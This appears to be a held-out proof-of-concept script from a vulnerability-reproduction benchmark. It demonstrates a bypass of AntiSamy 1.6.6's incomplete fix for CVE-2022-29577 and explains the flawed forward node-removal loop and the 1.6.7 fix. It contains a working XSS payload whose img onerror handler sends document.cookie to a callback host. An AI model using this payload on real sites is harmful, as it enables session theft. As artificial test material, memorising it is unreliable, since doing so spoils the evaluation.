#!/usr/bin/env python3
"""[HELD-OUT] CVE-2022-29577 residual -- the MULTI-node STYLE-tag smuggling that bypasses the
CVE-2022-28367 (AntiSamy 1.6.6) partial fix.

Same sink (`new AntiSamy().scan(html, antisamy.xml, DOM).getCleanHTML()`), same exfil channel as the
seed. The 1.6.6 fix concatenates the STYLE element's child text into the CSS scan and then tries to
REMOVE the extra child nodes -- but the removal loop iterates FORWARD over a LIVE NodeList:

    for (int i = 1; i < ele.getChildNodes().getLength(); i++) {   // AntiSamyDOMScanner 1.6.6
        Node childNode = ele.getChildNodes().item(i);
        ele.removeChild(childNode);
    }

Removing item(1) shifts item(2)->item(1) while i advances to 2 and getLength() shrinks, so roughly
every other smuggled child is SKIPPED and survives into the serialized output. A payload that makes
neko produce MULTIPLE smuggled child nodes inside the `<style>` therefore leaves at least one live
element in the output on V1 -> it executes in the browser -> flag exfiltrated. The 1.6.6 removal loop
never covered this multi-node case -> INCOMPLETE FIX.

On V2 (AntiSamy 1.6.7, the CVE-2022-29577 fix) the loop iterates in REVERSE:

    int childNodesCount = ele.getChildNodes().getLength();        // AntiSamyDOMScanner 1.6.7
    for (int i = childNodesCount - 1; i >= 1; i--) {
        ele.removeChild(ele.getChildNodes().item(i));
    }

which removes ALL smuggled children safely -> the residual is neutralized -> BLOCKED.

AntiSamy regression test (added with the 1.6.7 fix, testSmuggledTagsInStyleContent):
    "<select<style/>W<xmp<script>alert(1)</script>"  and  "<style/>b<![cdata[</style>..."
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# Finalized empirically against the running containers (see repro.log). TWO smuggled child nodes:
# a throwaway `<b></b>` element (child index 1) followed by the SAME raw `</style><img onerror>`
# breakout text (child index 2). The ONLY delta from the seed is that leading `<b></b>`, which pushes
# the dangerous node to an EVEN child index -- exactly the index the AntiSamy 1.6.6 FORWARD removal
# loop (for i=1; i<getLength(); i++ removeChild(item(i)) over a LIVE NodeList) SKIPS. So on V1 the
# breakout survives into the output -> the browser closes <style> at the smuggled </style> and the
# live <img onerror> fires on load -> flag exfiltrated. V2's REVERSE loop removes every child -> BLOCKED.
BYPASS_PAYLOAD = (
    "<style/>a<b></b><![cdata[</style>"
    "<img src=x onerror=\"document.location='" + CB + "'+document.cookie\">"
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 multi-node smuggling residual on `version`; return the callback dump (flag on V1)."""
    return run_payload(BYPASS_PAYLOAD, version, mode="load")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
